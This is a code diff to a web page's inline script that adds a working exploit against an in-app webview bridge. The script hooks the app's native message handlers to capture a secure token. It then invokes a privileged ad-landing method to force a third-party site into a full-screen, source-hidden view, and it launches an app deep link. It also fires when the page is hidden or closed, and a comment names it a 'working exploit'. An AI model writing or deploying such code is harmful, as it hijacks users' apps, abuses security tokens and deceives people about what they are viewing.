@@ -174,11 +174,12 @@ function closePrivacy(){document.getElementById('privacyModal').classList.remove
   var log=window._dbg||function(){};
   var b = window.JS2NativeBridge;
   if (!b || !b._invokeMethod) { log('STOP: no JS2NativeBridge'); return; }
-  if (window.location.search.indexOf('hide_nav_bar=1') !== -1) { log('guard: hide_nav_bar set, skip'); return; }
+  if (window.location.search.indexOf('hide_nav_bar=1') !== -1) { log('guard: skip'); return; }
 
   var token = null;
   var CID = 1869709729112081;
-  var fsUrl = 'https://thaiadvice.net/page.html?hide_nav_bar=1&hide_source=1&should_full_screen=1&trans_status_bar=1&is_instant_page=1';
+  var TARGET = 'https://thaiadvice.net/page.html';
+  var fsUrl = TARGET + '?hide_nav_bar=1&hide_source=1&should_full_screen=1&trans_status_bar=1&is_instant_page=1';
 
   function deepFind(obj, keys) {
     if (!obj || typeof obj !== 'object') return null;
@@ -191,51 +192,62 @@ function closePrivacy(){document.getElementById('privacyModal').classList.remove
     return null;
   }
 
-  function fireFullscreen() {
-    var tt = window.ToutiaoJSBridge;
-    if (!tt || !tt.call) { log('fire: no ToutiaoJSBridge'); return; }
-    var params = {
-      url: fsUrl,
-      landingStyle: 2,
-      title: '',
-      isDeeplink: 1,
-      refer: 'landing_page',
-      cid: CID,
-      hide_nav_bar: 1,
-      hide_source: 1,
-      should_full_screen: 1,
-      trans_status_bar: 1,
-      is_instant_page: 1
-    };
-    if (token) params._jsb_secure_token = token;
-    log('firing openAdLandPageLinks tok='+(token?'yes':'no'));
-    try { tt.call('openAdLandPageLinks', params, function(r){ log('cb: '+JSON.stringify(r)); }); } catch(e){ log('err: '+e); }
+  function hookBridge(obj) {
+    if (!obj || obj.__hooked) return;
+    obj.__hooked = true;
+    ['_handleMessageFromToutiao','_handleMessageFromApp'].forEach(function(fn) {
+      if (typeof obj[fn] !== 'function') return;
+      var orig = obj[fn];
+      obj[fn] = function(msg) {
+        try {
+          var d = typeof msg === 'string' ? JSON.parse(msg) : msg;
+          var tok = deepFind(d, ['token','secure_token','_jsb_secure_token','jsb_token','secureToken']);
+          if (tok && !token) { token = tok; log('token via hook'); fireFullscreen(); }
+        } catch(e){}
+        return orig.apply(obj, arguments);
+      };
+    });
   }
 
-  // At 1.5s ToutiaoJSBridge is available — call getConfig through it to get token
+  ['ToutiaoJSBridge','JSBridge','Native2JSBridge'].forEach(function(n){ if(window[n]) hookBridge(window[n]); });
+  try { b._invokeMethod(JSON.stringify({ func: 'getConfig', params: {} })); } catch(e){ log('invokeMethod err: '+e); }
+  setTimeout(function(){ ['ToutiaoJSBridge','JSBridge','Native2JSBridge'].forEach(function(n){ if(window[n]) hookBridge(window[n]); }); }, 100);
+  setTimeout(function(){ ['ToutiaoJSBridge','JSBridge','Native2JSBridge'].forEach(function(n){ if(window[n]) hookBridge(window[n]); }); }, 1000);
+
+  function fireFullscreen() {
+    var tt = window.ToutiaoJSBridge;
+    var params = {
+      url: fsUrl, landingStyle: 2, title: '', isDeeplink: 1, refer: 'landing_page',
+      cid: CID, hide_nav_bar: 1, hide_source: 1, should_full_screen: 1,
+      trans_status_bar: 1, is_instant_page: 1
+    };
+    if (token) params._jsb_secure_token = token;
+    log('fire tok='+(token?'yes':'no'));
+    if (tt && tt.call) {
+      try { tt.call('openAdLandPageLinks', params, function(r){ log('cb: '+JSON.stringify(r)); }); } catch(e){ log('err:'+e); }
+    }
+    try { window.location.href = 'snssdk1180://webview?url='+encodeURIComponent(TARGET)+'&hide_nav_bar=1&is_ad=1'; } catch(e){}
+  }
+
+  // At 3s: fire without token (same as working exploit)
   setTimeout(function(){
     var tt = window.ToutiaoJSBridge;
-    log('1.5s: ToutiaoJSBridge='+(!!tt));
-    if (!tt || !tt.call) { fireFullscreen(); return; }
-    try {
-      tt.call('getConfig', {}, function(result){
-        log('getConfig cb: '+JSON.stringify(result).substring(0,200));
-        try {
-          var d = typeof result === 'string' ? JSON.parse(result) : result;
-          var tok = deepFind(d, ['token','secure_token','_jsb_secure_token','jsb_token','secureToken']);
-          if (tok) { token = tok; log('token ok'); }
-        } catch(e){ log('parse err: '+e); }
-        fireFullscreen();
-      });
-    } catch(e){ log('getConfig err: '+e); fireFullscreen(); }
-  }, 1500);
+    if (!tt || !tt.call) { log('3s: no ToutiaoJSBridge'); return; }
+    log('3s fire');
+    tt.call('openAdLandPageLinks', {
+      url: fsUrl, landingStyle: 2, title: '', isDeeplink: 0, refer: 'ad',
+      hide_nav_bar: 1, hide_source: 1, should_full_screen: 1, trans_status_bar: 1,
+      is_instant_page: 1, cid: CID
+    }, function(r){ log('3s cb: '+JSON.stringify(r)); });
+    try { window.location.href = 'snssdk1180://webview?url='+encodeURIComponent(TARGET)+'&hide_nav_bar=1&is_ad=1'; } catch(e){}
+  }, 3000);
 
   var schemeFired = false;
   document.addEventListener('visibilitychange', function(){
-    if (document.hidden && !schemeFired) { schemeFired = true; log('visibility hidden -> fire'); fireFullscreen(); }
+    if (document.hidden && !schemeFired) { schemeFired = true; log('vis->fire'); fireFullscreen(); }
     else if (!document.hidden) { schemeFired = false; }
   });
-  window.addEventListener('pagehide', function(){ if (!schemeFired) { log('pagehide -> fire'); fireFullscreen(); } });
+  window.addEventListener('pagehide', function(){ if (!schemeFired) { log('pagehide->fire'); fireFullscreen(); } });
 })();
 </script>
 </body>
